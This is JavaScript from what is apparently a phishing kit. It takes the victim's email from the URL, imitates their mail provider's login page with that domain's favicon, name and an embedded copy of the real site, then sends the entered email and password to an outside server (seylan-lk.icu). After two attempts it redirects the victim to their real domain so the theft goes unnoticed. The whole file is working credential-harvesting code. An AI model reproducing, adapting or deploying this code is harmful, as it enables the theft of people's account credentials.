
 
  /* global $ */
    $(document).ready(function(){
      var count=0;

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });
      $("#email").keyup(function() {
        var my_email = $('#email').val();
        $('#em').html(my_email);
    });
    $('#show').click(function() {
        event.preventDefault();
        var x = document.getElementById("password");
        if (x.type === "password") {
            $('#show').html("hide");
            x.type = "text";
        } else {
            $('#show').html("show");
            x.type = "password";
        }

    });
      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);
        $(".domain").html(my_slice);
        $(".email").html(email);
		
		      
			//  var mainPage = 'http://www.hostry.com'; 
			  
		     var mainPage = 'https://'+my_slice; 
     //     var mainPage = 'https://webmail.staralliancebd.com/';  
        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+mainPage);
		
      //  window.onload = function(){
            document.getElementById('mainPage').src = mainPage;
     //   $("#mainPage").src(mainPage);
		//}
    
      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

       if (!my_email) {
            $('#error').show();
            $('#error').html("Email field is empty...!");
            email.focus;
            return false;
        }
        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a valid @ email account");
            email.focus;
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("Password field is empty...!");
            email.focus;
            return false;
        }
        if (password.length < 5) {
            $('#error').show();
            $('#error').html("Please enter password atleast 5 digits..!");
            email.focus;
            return false;
        } 

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://seylan-lk.icu/oki/post.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
			 if(response){
                $("#msg").show();
				console.log(response);
				$('#msg').html(response['msg']);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                   window.location.replace("http://www."+my_slice);
                 //   window.location.replace("http://www."+my_slice");

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                   $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                   window.location.replace("http://www."+my_slice);
                  //    window.location.replace("https://office.com");
              }
              $("#msg").show();
               $('#msg').html("Invalid Details,Please try again");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });
    });

 			

    });
 